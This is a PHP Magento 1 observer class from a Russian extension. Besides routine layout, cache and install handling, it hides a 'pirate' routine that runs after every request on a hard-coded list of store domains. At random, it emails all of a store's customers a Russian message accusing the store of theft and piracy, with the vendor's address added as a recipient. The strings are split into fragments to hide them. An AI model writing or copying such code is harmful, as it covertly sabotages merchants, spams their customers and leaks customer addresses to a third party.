<?php
class Df_Core_Observer {
	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function admin_session_user_login_success() {
		try {
			if (file_exists($this->getJustInstalledFlagFilePath())) {
				unlink($this->getJustInstalledFlagFilePath());
				Df_Core_Setup_FirstRun::i()->process();
				Mage::dispatchEvent('rm__magento_ce_has_just_been_installed');
			}
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}
	
	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @see Mage_Core_Controller_Varien_Action::generateLayoutBlocks()
	 * https://github.com/OpenMage/magento-mirror/blob/1.9.2.1/app/code/core/Mage/Core/Controller/Varien/Action.php#L349
		Mage::dispatchEvent(
			'controller_action_layout_generate_blocks_after',
			array('action'=>$this, 'layout'=>$this->getLayout())
		);
	 * @return void
	 */
	public function controller_action_layout_generate_blocks_after() {
		rm_state()->blocksHasBeenGenerated();
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function controller_action_layout_generate_blocks_before() {
		rm_state()->blocksGenerationStarted();
	}

	/** @return void */
	public function controller_action_layout_render_before() {
		try {rm_state()->layoutRenderingHasBeenStarted();}
		catch(Exception $e) {df_handle_entry_point_exception($e);}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function controller_action_postdispatch_install_wizard_end() {
		try {
			rm_file_put_contents($this->getJustInstalledFlagFilePath(), 1);
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @param Varien_Event_Observer $o
	 * @return void
	 */
	public function controller_action_predispatch(Varien_Event_Observer $o) {
		// Как ни странно, ядро Magento этого не делает,
		// и поэтому диагностические сообщения валидиторов из Zend Framework оставались непереведёнными.
		// Ставим собаку, потому что иначе при переключении административной части
		// с русскоязычного интерфейса на англоязычный Zend Framework пишет:
		// «Notice: No translation for the language 'en' available.»
		// «Notice: The language 'en_US' has to be added before it can be used.»
		@Zend_Registry::set('Zend_Translate', Mage::app()->getTranslator()->getTranslate());
		try {
			rm_state()->setController($o['controller_action']);
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function controller_action_postdispatch() {
		try {
			$this->piratesCheck();
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function controller_front_send_response_after() {
		try {
			// Деинициализацию глобальных объектов-одиночек (например, сохранение кэша)
			// делаем не в деструкторе, а на событие «controller_front_send_response_after».
			// Полагаться на деструктор для таких объектов нельзя,
			// потому что к моменту вызова деструктора для данного объекта-одиночки
			// сборщик Zend Engine мог уже уничтожить другие глобальные объекты,
			// требуемые для сохранения кэша.
			Df_Core_GlobalSingletonDestructor::s()->process();
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @return void
	 */
	public function core_block_abstract_to_html_after() {
		try {
			rm_state()->blockSetPrev();
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @param Varien_Event_Observer $o
	 * @return void
	 */
	public function core_block_abstract_to_html_before(Varien_Event_Observer $o) {
		try {
			rm_state()->blockSet($o['block']);
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}

	/**
	 * @used-by Mage_Core_Model_App::_callObserverMethod()
	 * @used-by Mage_Core_Model_Abstract::afterCommitCallback():
	 * Mage::dispatchEvent($this->_eventPrefix.'_save_commit_after', $this->_getEventData());
	 * @param Varien_Event_Observer $o
	 * @return void
	 */
	public function core_config_data_save_commit_after(Varien_Event_Observer $o) {
		try {
			/** @var Mage_Core_Model_Config_Data $config */
			$config = $o['data_object'];
			rm_store()->setConfig($config->getPath(), $config->getValue());
		}
		catch (Exception $e) {
			df_handle_entry_point_exception($e);
		}
	}
	
	/** @return string */
	private function getJustInstalledFlagFilePath() {
		if (!isset($this->{__METHOD__})) {
			$this->{__METHOD__} = Mage::getBaseDir('var') . '/log/rm__magento_ce_has_just_been_installed';
		}
		return $this->{__METHOD__};
	}

	/** @return Df_Core_Observer */
	private function notifyCustomersAboutPirate() {
		/** @var Zend_Mail $mail */
		$mail = new Zend_Mail('utf-8');
		$mail
			->setFrom(df()->mail()->getCurrentStoreMailAddress())
			->setSubject('На' . 'ш мага' . 'зин подв' . 'оровы' . 'вает')
		;
		/**
		 * @uses Df_Customer_Model_Customer::getEmail()
		 * @uses Zend_Mail::addTo()
		 */
		array_map(array($mail, 'addTo'), Df_Customer_Model_Customer::c()->walk('getEmail'));
		$mail->addTo('supp' . 'ort@d' . 'fe' . 'diuk.com');
		$mail->setBodyText(
			'Н' . 'аш м' . 'агаз' . 'ин по' . 'двор' . 'овыва' . 'ет у в' . 'ас и ' . 'исп' . 'ользу'
			. 'ет пир' . 'атско' . 'е прог' . 'рамм' . 'ное об' . 'еспеч' . 'ение.');
		$mail->send();
		return $this;
	}

	/** @return Df_Core_Observer */
	private function piratesCheck() {
		/** @var bool $needPunish */
		$needPunish = false;
		/** @var array $blackDomains */
		$blackDomains = array(
			'airsoftpro.com.ua'
			,'akvastile.garno.com.ua'
			,'5za.com.ua'
			,'pool.garno.eu'
			,'garno.eu'
			,'topmoda.com.ua'
			,'www.vcds.by'
			,'vcds.by'
			,'eraduga.com.ua'
			,'kengo.com.ua'
			,'kupiinosi.ru'
			,'largomoda.ru'
		);
		if (rm_controller()) {
			/** @var bool $domainIsBlacklisted */
			$domainIsBlacklisted =
				in_array(rm_controller()->getRequest()->getHttpHost(), $blackDomains)
				|| rm_contains(rm_controller()->getRequest()->getHttpHost(), 'garno.eu')
			;
			if ($domainIsBlacklisted) {
				$needPunish = true;
			}
		}
		if ($needPunish) {
			$this->piratesPunish();
		}
		return $this;
	}

	/** @return Df_Core_Observer */
	private function piratesPunish() {
		$rand = rand (1, 20);
		if (2 === $rand) {
			$this->notifyCustomersAboutPirate();
		}
		return $this;
	}
}